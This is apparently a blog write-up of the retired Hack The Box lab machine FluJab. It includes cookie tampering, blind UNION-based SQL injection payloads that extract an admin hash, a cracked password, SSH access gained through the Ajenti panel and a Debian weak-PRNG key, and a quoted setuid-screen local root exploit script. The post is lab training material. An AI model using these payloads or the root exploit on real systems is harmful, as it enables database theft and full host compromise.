---
layout: post
title: "FluJab: Hack The Box Walkthrough"
date: 2019-06-16 04:17:44 +0000
last_modified_at: 2019-06-16 04:17:51 +0000
category: Walkthrough
tags: ["Hack The Box", FluJab, retired]
comments: true
image:
  feature: flujab-htb-walkthrough.jpg
  credit: HeungSoon / Pixabay
  creditlink: https://pixabay.com/en/syringe-treatment-medical-medicine-3908153/
---

This post documents the complete walkthrough of FluJab, a retired vulnerable [VM][1] created by [3mrgnc3][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## Background

FluJab is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.124 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-28 05:19:15 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.124
Discovered open port 80/tcp on 10.10.10.124
Discovered open port 443/tcp on 10.10.10.124
Discovered open port 8080/tcp on 10.10.10.124
```

`masscan` finds four open ports. Let's do one better with `nmap` scanning the discovered ports.

```
# nmap -n -v -Pn -p22,80,443,8080 -A --reason -oN nmap.txt 10.10.10.124
...
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh?     syn-ack ttl 63
80/tcp   open  http     syn-ack ttl 63 nginx
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: ClownWare Proxy
|_http-title: Did not follow redirect to https://10.10.10.124/
443/tcp  open  ssl/http syn-ack ttl 63 nginx
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: ClownWare Proxy
|_http-title: Direct IP access not allowed | ClownWare
| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
| Issuer: commonName=ClownWare Certificate Authority/organizationName=ClownWare Ltd./stateOrProvinceName=LON/countryName=UK
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-11-28T14:57:03
| Not valid after:  2023-11-27T14:57:03
| MD5:   1f22 1ef7 c8bf d110 dfe6 2b6f 0765 2245
|_SHA-1: 7013 803a 92b3 f1f0 735d 404b 733c 712b bea6 ffcc
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
8080/tcp open  ssl/http syn-ack ttl 63 nginx
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: ClownWare Proxy
|_http-title: Direct IP access not allowed | ClownWare
| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
| Issuer: commonName=ClownWare Certificate Authority/organizationName=ClownWare Ltd./stateOrProvinceName=LON/countryName=UK
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-11-28T14:57:03
| Not valid after:  2023-11-27T14:57:03
| MD5:   1f22 1ef7 c8bf d110 dfe6 2b6f 0765 2245
|_SHA-1: 7013 803a 92b3 f1f0 735d 404b 733c 712b bea6 ffcc
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
```

Hmm. `nmap` can't determine the SSH version. That's strange.

<a class="image-popup">
![e907cfcb.png](/assets/images/posts/flujab-htb-walkthrough/e907cfcb.png)
</a>

This tells me that something is blocking my advances, maybe a firewall or TCP wrapper. Check out the traffic.

<a class="image-popup">
![b271c093.png](/assets/images/posts/flujab-htb-walkthrough/b271c093.png)
</a>

Definitely looks like a TCP wrapper. In any case, I'll keep this in mind and kick off the exploration with the `http` service. This is how it looks like.

<a class="image-popup">
![b0c0232f.png](/assets/images/posts/flujab-htb-walkthrough/b0c0232f.png)
</a>

There's a suggestion on how to get rid of the error. Looks alot like CloudFlare error, don't you think so? :smirk:

<a class="image-popup">
![c3f2cbb0.png](/assets/images/posts/flujab-htb-walkthrough/c3f2cbb0.png)
</a>

Check out the valid alternative names for the SSL certificate.

```
DNS Name: clownware.htb
DNS Name: sni147831.clownware.htb
DNS Name: *.clownware.htb
DNS Name: proxy.clownware.htb
DNS Name: console.flujab.htb
DNS Name: sys.flujab.htb
DNS Name: smtp.flujab.htb
DNS Name: vaccine4flu.htb
DNS Name: bestmedsupply.htb
DNS Name: custoomercare.megabank.htb
DNS Name: flowerzrus.htb
DNS Name: chocolateriver.htb
DNS Name: meetspinz.htb
DNS Name: rubberlove.htb
DNS Name: freeflujab.htb
DNS Name: flujab.htb
```

Save the above into `hosts.txt`. Pop these hostnames into `/etc/hosts` and we should be good.

```
# HOSTS=$(awk '{ print $NF }' hosts.txt | tr '\n' ' ')
# echo -e "10.10.10.124\t$HOSTS" >> /etc/hosts
```

## Free Flu Jab. Why Not?

Long story short, the only site that yields any kind of sensible result is https://freeflujab.htb. The rest of the sites are there for a purpose—to keep you within the the scope of the penetration testing engagement, if you are into that sort of thing. The name of the box already suggests that.

The site is influenced by three cookies: `Modus`, `Patient` and `Registered`.

+ The `Modus` cookie is the `base64`-encoding of the string `Configure=Null`. It only affects `/?smtp_config` path.
+ The `Patient` cookie is the MD5 hash of my IP address
+ The `Registered` cookie is the `base64`-encoding of the string \<MD5 of IP\>=Null

To navigate around the site requires the use of Burp's Repeater or you'll hit many roadblocks set up by the creator. The first attack surface lies in the Cancel Appointment or Remind Appointment.

To cancel an appointment, provide a ten-digit [NHS number](https://en.wikipedia.org/wiki/NHS_number) in this format: `NHS-\d{3}-\d{3}-\d{4}`, where `\d` represents a digit from 0 to 9.

<a class="image-popup">
![4a7a5e06.png](/assets/images/posts/flujab-htb-walkthrough/4a7a5e06.png)
</a>

Once you hit the "Cancel Appointment" button, this is what you'll see.

<a class="image-popup">
![790bf020.png](/assets/images/posts/flujab-htb-walkthrough/790bf020.png)
</a>

This is the first clue. Remember the `Modus` cookie? That's where you modify the cookie to configure a valid SMTP server in order to bypass this error and capture the next clue.

Change `Configure=Null` to `Configure=True` and `base64`-encode it. You should get the following:

```
Modus=Q29uZmlndXJlPVRydWU%3D
```

Supply the modified cookie to your browser and you should see the following when you navigate to `/?smtp_config`.

<a class="image-popup">
![44f744f2.png](/assets/images/posts/flujab-htb-walkthrough/44f744f2.png)
</a>

I'm assuming you know how to use Burp. At this point, you should send the previous request to Burp's Repeater so that you can modify the mailserver field to a SMTP server you control. Ah, you get the idea, don't you? :smile:

<a class="image-popup">
![992039f3.png](/assets/images/posts/flujab-htb-walkthrough/992039f3.png)
</a>

Once that's done, try to cancel another appointment. You'll get a cancellation notice from the duty nurse like so. You might ask how the hell do you set up a SMTP server? Well, Python `smtpd` module is all you need.

<a class="image-popup">
![238e6ca0.png](/assets/images/posts/flujab-htb-walkthrough/238e6ca0.png)
</a>

That's our second clue. Here's how the logic works. When you cancel an appointment tied to a NHS number, the application checks for the NHS number in the backend, and sends a notice with the NHS number as the reference number in the email's subject. I smell SQL injection...

That's a tiny problem. Automated SQLi queries doesn't work because the response is totally blind, or out-of-band. You only get to see whether the injection works from the email subject. Let's try the following query.

<a class="image-popup">
![6b847537.png](/assets/images/posts/flujab-htb-walkthrough/6b847537.png)
</a>

Boom, we have injection in `nhsnum`.

<a class="image-popup">
![0c96da90.png](/assets/images/posts/flujab-htb-walkthrough/0c96da90.png)
</a>

I've worked out the following UNION-based queries to manually extract information from the database.

```
show databases
--------------
nhsnum=' UNION SELECT 1,2,GROUP_CONCAT(schema_name SEPARATOR ','),4,5 FROM information_schema.schemata;#&submit=Cancel+Appointment

show tables in 'vaccinations' database
--------------------------------------
nhsnum=' UNION SELECT 1,2,GROUP_CONCAT(table_name SEPARATOR ','),4,5 FROM information_schema.tables WHERE table_schema = 'vaccinations';#&submit=Cancel+Appointment

show columns in 'admin' table in 'vaccinations' database
--------------------------------------------------------
nhsnum=' UNION SELECT 1,2,GROUP_CONCAT(column_name SEPARATOR ','),4,5 FROM information_schema.columns WHERE table_name = 'admin' AND table_schema = database();#&submit=Cancel+Appointment

show 'password' column
----------------------
nhsnum=' UNION SELECT 1,2,password,4,5 FROM admin;#&submit=Cancel+Appointment

count rows in 'admin' table
---------------------------
nhsnum=' UNION SELECT 1,2,COUNT(*),4,5 FROM admin;#&submit=Cancel+Appointment

show database users
-------------------
nhsnum=' UNION SELECT 1,2,GROUP_CONCAT(User SEPARATOR ','),4,5 FROM mysql.user;#&submit=Cancel+Appointment
``````

Using a combination of the above queries, I was able to streamline to the following result.

<a class="image-popup">
![ac91df80.png](/assets/images/posts/flujab-htb-walkthrough/ac91df80.png)
</a>

```
1:sysadm:administrator:syadmin@flujab.htb:sysadmin-console-01.flujab.htb:a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602
```

We got ourselves a SHA256 password hash! Keep my fingers crossed that rockyou would suffice.

<a class="image-popup">
![f6849d38.png](/assets/images/posts/flujab-htb-walkthrough/f6849d38.png)
</a>

Pretty fast!

## Ajenti Panel

We can now proceed to the next clue, armed with the credential (`sysadm:th3doct0r`) and the access host. Suffice to say, we need to put `sysadmin-console-01.flujab.htb` into `/etc/hosts` as well.

<a class="image-popup">
![10c3ded1.png](/assets/images/posts/flujab-htb-walkthrough/10c3ded1.png)
</a>

Notice that Ajenti is on another open port (`8080/tcp`) discovered earlier?

<a class="image-popup">
![850c8d54.png](/assets/images/posts/flujab-htb-walkthrough/850c8d54.png)
</a>

Let's cut to the chase. You can use Ajenti's web interface or the REST API to read/write files as `sysadm` of course.

<a class="image-popup">
![7bf9054f.png](/assets/images/posts/flujab-htb-walkthrough/7bf9054f.png)
</a>

The API is available as AngularJS modules.

<a class="image-popup">
![79ee2cb7.png](/assets/images/posts/flujab-htb-walkthrough/79ee2cb7.png)
</a>

## Low-Privilege Shell

Let's use both methods to get ourselves a shell...

<a class="image-popup">
![f50b55c7.png](/assets/images/posts/flujab-htb-walkthrough/f50b55c7.png)
</a>

You can see from above that there's an alternate `AuthorizedKeysFile` path. Bear in mind the path is relative to a user's home directory. And, since I'm logged in as `sysadm` I can write to `/home/sysadm/access` the contents of a SSH public key I control.

<a class="image-popup">
![7b5ac36e.png](/assets/images/posts/flujab-htb-walkthrough/7b5ac36e.png)
</a>

Copy and paste the content of the public key to `/home/sysadm/access` using the web interface.

<a class="image-popup">
![8351b2bc.png](/assets/images/posts/flujab-htb-walkthrough/8351b2bc.png)
</a>

Let's change the file mode of `access` with the `chmod` function. Take note that the `chmod` takes an argument `mode` in integer packed in JSON. Unix file mode `600` is in octal, which is `384` in decimal. The request below reflects that.

<a class="image-popup">
![7f3b19a2.png](/assets/images/posts/flujab-htb-walkthrough/7f3b19a2.png)
</a>

One more thing. Recall that `nmap` couldn't determine the SSH version? This is why.

<a class="image-popup">
![929fa6a8.png](/assets/images/posts/flujab-htb-walkthrough/929fa6a8.png)
</a>

However, we can bypass it, if and only if, we can modify `/etc/hosts.allow`. That's because `/etc/hosts.allow` takes precedence over `/etc/hosts.deny`. Guess what? We have the permissions to edit it. :triumph:

<a class="image-popup">
![a37c35b8.png](/assets/images/posts/flujab-htb-walkthrough/a37c35b8.png)
</a>

Strangely, I need two directives to completely bypass `/etc/hosts.deny`. Once that's done, we can login as `sysadm` via SSH.

<a class="image-popup">
![056db148.png](/assets/images/posts/flujab-htb-walkthrough/056db148.png)
</a>

During enumeration of `sysadm`'s account, I notice in `/etc/ssh/deprecated_keys` a notice that says the public keys in that directory were compromised and are kept there for audit purposes

<a class="image-popup">
![8fe3729c.png](/assets/images/posts/flujab-htb-walkthrough/8fe3729c.png)
</a>

Yeah, right...One of the public keys is still being used by a certain doctor. Cheeky bastard.

```
$ ssh-keygen -l -f 0223269.pub
4096 SHA256:zOAcAtkPPKXqN8/XrkIk9w2V9ysS1sqEnklien7DruE drno@flujab.htb (RSA)
```

If I have to guess, I would say the compromised keys are linked to the Debian OpenSSL Predictable PRNG [issue](https://github.com/g0tmi1k/debian-ssh). In that case, we can easily search for the corresponding private key from the archive (which can be downloaded from the same URL) containing the 4096-bit keypairs.

```
# tar jtvf debian_ssh_rsa_4096_x86.tar.bz2 | grep $(ssh-keygen -E md5 -l -f 0223269.pub | cut -d' ' -f2 | cut -d ':' -f2- | tr -d ':')
-rw------- root/root      3239 2008-05-14 22:22 rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269
-rw-r--r-- root/root       740 2008-05-14 22:22 rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269.pub
```

We need just the private key. Let's extract it.

```
# tar jxvf debian_ssh_rsa_4096_x86.tar.bz2 rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269
rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269
```

Time to log in!

<a class="image-popup">
![3f44591b.png](/assets/images/posts/flujab-htb-walkthrough/3f44591b.png)
</a>

The `user.txt` is found in `drno`'s home directory.

<a class="image-popup">
![d3064752.png](/assets/images/posts/flujab-htb-walkthrough/d3064752.png)
</a>

## Privilege Escalation

Privilege escalation is pretty straight forward from here.

<a class="image-popup">
![2dc3462d.png](/assets/images/posts/flujab-htb-walkthrough/2dc3462d.png)
</a>

Simply follow the steps outlined in EDB-ID [41154](https://www.exploit-db.com/exploits/41154). As there's no `gcc` in the remote box, remove the lines that attempt to write and compile source codes. Instead, compile them in your attacking machine and `scp` them to `/tmp` in the remote box.

<div class="filename"><span>screenroot.sh</span></div>

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
export PATH=/usr/local/share/screen:$PATH
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

<a class="image-popup">
![295c2be7.png](/assets/images/posts/flujab-htb-walkthrough/295c2be7.png)
</a>

Heck. I don't even need to pwn the `drno` account. Anyway, getting the `root.txt` with a `root` shell is trivial.

<a class="image-popup">
![f850e86c.png](/assets/images/posts/flujab-htb-walkthrough/f850e86c.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/171
[2]: https://www.hackthebox.eu/home/users/profile/6983
[3]: https://www.hackthebox.eu/
